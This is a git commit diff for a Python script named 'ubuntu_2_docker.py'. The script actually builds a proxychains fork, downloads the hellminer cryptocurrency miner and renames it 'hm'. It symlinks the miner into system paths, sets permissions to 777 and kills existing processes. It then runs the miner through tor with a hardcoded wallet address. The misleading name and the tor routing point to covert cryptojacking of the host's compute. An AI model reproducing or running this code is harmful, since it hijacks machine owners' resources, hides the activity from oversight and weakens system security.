daac71ed82420b527ea4078835d265872feadaf2
HarrisNancyvwguc <HarrisNancyvwguc@gmail.com>
2024-12-11 16:26:02 -0600

    Update ubuntu_2_docker.py

--- ubuntu_2_docker.py
+++ ubuntu_2_docker.py
@@ -1,61 +1,83 @@
+#!/usr/bin/env python3
+
 __author__ = 'root'
 
 import os
 import sys
 import time
+import shutil
+import subprocess
 import multiprocessing
 
-# Set execute permissions on the script
-os.system('chmod 777 ' + __file__)
 
-# Program name
-program = 'hm'
+def run_command(command, shell=True, check=True):
+    """
+    Run a shell command and handle errors.
+    """
+    try:
+        subprocess.run(command, shell=shell, check=check)
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing command: {command}\n{e}")
+        sys.exit(1)
 
-# Kill existing processes with the program name
-os.system('pkill ' + program)
 
-# Calculate the number of CPU cores
-cores = multiprocessing.cpu_count() - 1
-if cores <= 0:
-    cores = 1
+def main():
+    # Set execute permissions on the script
+    run_command(f'chmod 777 "{__file__}"')
 
-# Set huge pages for memory management
-os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
+    # Program name
+    program = 'hm'
 
-try:
-    # Update and install dependencies
-    os.system('apt-get update -y')
-    os.system('apt -qqy install wget procps libsodium-dev >/dev/null 2>&1 || apt -qqy install wget procps libsodium-dev >/dev/null 2>&1')
-    os.system('apt-get install gcc make tor python python-dev -y')
+    # Kill existing processes with the program name
+    run_command(f'pkill {program}')
 
-    # Clone and build proxychains-ng
-    os.system('rm -rf proxychains-ng')
-    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
-    os.chdir('proxychains-ng')
-    os.system('make')
-    os.system('make install')
-    os.system('make install-config')
+    # Calculate the number of CPU cores
+    cores = multiprocessing.cpu_count() - 1
+    if cores <= 0:
+        cores = 1
 
-    # Download and install hellminer
-    if not os.path.isfile('/usr/local/bin/' + program):
-        tmp = os.popen('mktemp -d').read().strip()
-        os.system(f'wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz | tar -zx -C "{tmp}"')
-        os.chdir(tmp)
-        os.system('chmod 777 -R ./')
-        os.system('rm -rf ./*.sh')
-        os.system('mv h* hm')
-        workingdir = os.getcwd()
-        os.system(f'ln -s -f {workingdir}/hm /usr/local/bin/{program}')
-        os.system(f'ln -s -f {workingdir}/hm /usr/bin/{program}')
-        time.sleep(2)
+    # Set huge pages for memory management
+    run_command('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
 
-except Exception as e:
-    print(f"An error occurred: {e}")
-    sys.exit(1)
+    try:
+        # Update and install dependencies
+        run_command('apt-get update -y')
+        run_command('apt -qqy install wget procps libsodium-dev >/dev/null 2>&1 || apt -qqy install wget procps libsodium-dev >/dev/null 2>&1')
+        run_command('apt-get install gcc make tor python3 python3-dev -y')
 
-# Start tor
-os.system('tor &')
-time.sleep(60)
+        # Clone and build proxychains-ng
+        run_command('rm -rf proxychains-ng')
+        run_command('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
+        os.chdir('proxychains-ng')
+        run_command('make')
+        run_command('make install')
+        run_command('make install-config')
+        os.chdir('..')
 
-# Run hellminer with proxychains4
-os.system(f'proxychains4 {program} -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx -p d=16384S,hybrid')
+        # Download and install hellminer
+        if not os.path.isfile(f'/usr/local/bin/{program}'):
+            tmp_dir = subprocess.check_output('mktemp -d', shell=True).decode().strip()
+            run_command(f'wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz | tar -zx -C "{tmp_dir}"')
+            os.chdir(tmp_dir)
+            run_command('chmod 777 -R ./')
+            run_command('rm -rf ./*.sh')
+            run_command('mv h* hm')
+            working_dir = os.getcwd()
+            run_command(f'ln -s -f {working_dir}/hm /usr/local/bin/{program}')
+            run_command(f'ln -s -f {working_dir}/hm /usr/bin/{program}')
+            time.sleep(2)
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        sys.exit(1)
+
+    # Start tor
+    run_command('tor &')
+    time.sleep(60)
+
+    # Run hellminer with proxychains4
+    run_command(f'proxychains4 {program} -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx -p d=16384S,hybrid')
+
+
+if __name__ == "__main__":
+    main()
